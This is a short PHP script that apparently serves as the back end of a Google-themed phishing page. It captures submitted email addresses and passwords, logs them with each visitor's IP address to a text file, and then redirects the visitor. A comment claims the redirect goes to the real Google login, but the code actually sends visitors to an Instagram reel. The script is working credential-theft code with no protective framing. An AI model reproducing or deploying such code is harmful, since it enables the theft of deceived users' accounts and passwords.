<?php
// File to save credentials
$file = "google_credentials.txt";

// Get data from form
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

// Save credentials
if (!empty($email) && !empty($password)) {
    $data = "Email: " . $email . " | Password: " . $password . " | IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    file_put_contents($file, $data, FILE_APPEND);
}

// Redirect to real Google login
header("Location: https://www.instagram.com/reel/DFkw9LNNOwe/?igsh=MWVic3o4a2c3YjNtdA==");
exit();
?>

